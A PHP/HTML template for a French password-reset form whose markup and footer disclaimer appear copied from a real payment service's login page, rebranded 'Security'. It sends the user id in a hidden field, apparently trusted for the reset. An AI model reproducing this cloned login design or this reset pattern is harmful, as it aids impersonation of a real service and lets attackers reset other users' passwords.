<section id="login" class="login" data-role="page" data-title="Connectez-vous à votre compte security">
    <div class="corral">
        <div id="content" class="contentContainer">
            <header>
                <p class="security-logo security-logo-long">Security</p>
            </header>
            <?php session('token', uniqid() . uniqid()) ?>
            <h1 class="headerText accessAid">Reinitialisatiion</h1>
            <form id="connexion" action="?p=guest/reinitialisation" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                <?php message('Veillez vous connecter en premier lieu.', 'notConnected', 'danger') ?>
                <?php message('Veillez faire une demande de reinitialisation en premier lieu', 'forgotNoToken', 'danger') ?>
                <?php message('Votre identifiant n\'est pas associé à un compte.', 'notFound', 'danger') ?>
                <?php message('Identifiant ou mot de passe incorrect', 'badPwd', 'danger') ?>
                <?php message('Veillez remplir votre identifiant et mot de passe.', 'void', 'danger') ?>
                <input id="token" name="token_csrf" value="<?= session('token') ?>" type="hidden">
                <input id="token" name="id" value="<?= $users->idUser ?>" type="hidden">
                <div id="passwordSection" class="clearfix">
                    <div class="textInput" id="login_emaildiv">
                        <div class="fieldWrapper">
                            <label for="email" class="fieldLabel">Adresse email</label>
                            <input id="email" name="email" value="<?= $users->email ?>" class="hasHelp  validateEmpty" required="required" autocomplete="off" placeholder="Numéro de compte ou Email" type="text">
                        </div>
                    </div>
                    <div class="textInput lastInputField" id="login_passworddiv">
                        <div class="fieldWrapper">
                            <label for="password" class="fieldLabel">Entrez un mot de passe.</label>
                            <input id="password" name="mdp" class="hasHelp validateEmpty pin-password" required="required" placeholder="Entrez un mot de passe." type="password"></div>
                        <div class="errorMessage" id="passwordErrorMessage">
                            <p class="emptyError hide">Entrez un mot de passe.</p>
                        </div>
                    </div>
                    <div style="margin-top: 10px" class="textInput lastInputField" id="login_passworddiv">
                        <div class="fieldWrapper">
                            <label for="password" class="fieldLabel">Confirmez le mot de passe.</label>
                            <input id="password" name="nmdp" class="hasHelp validateEmpty pin-password" required="required" placeholder="Entrez un mot de passe." type="password"></div>
                        <div class="errorMessage" id="passwordErrorMessage">
                            <p class="emptyError hide">Entrez un mot de passe.</p>
                        </div>
                    </div>
                </div>
                <div class="actions actionsSpaced">
                    <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">
                        Connexion
                    </button>
                </div>
            </form>
            <a style="margin-top: 15px" href="?p=guest/create" class="button secondary scExit:unifiedlogin-login-click-signUp" id="createAccount">
                Ouvrir un compte
            </a>
        </div>
    </div>
    <footer class="footer" role="contentinfo">
        <!--<div class="extendedContent">
            <ul class="footerGroup footerGroupWithSiblings">
                <li><a href="#">Respect de la vie privée</a>
                </li>
                <li><a href="#">Contrats d'utilisation</a></li>
            </ul>
            <p class="footerCopyright">Copyright © 1999-2017 Security. Tous droits réservés.</p>
            <p class="footerDisclaimer">
                Avis aux utilisateurs&nbsp;: Security Pte. Ltd. détenteur de la fonction de porte-monnaie électronique de Security, n'est pas soumis à l'approbation de la Monetary Authority of Singapore. Nous invitons les utilisateurs à lire attentivement les <a href="#">Conditions générales</a>.
            </p>
        </div>-->
    </footer>
</section>
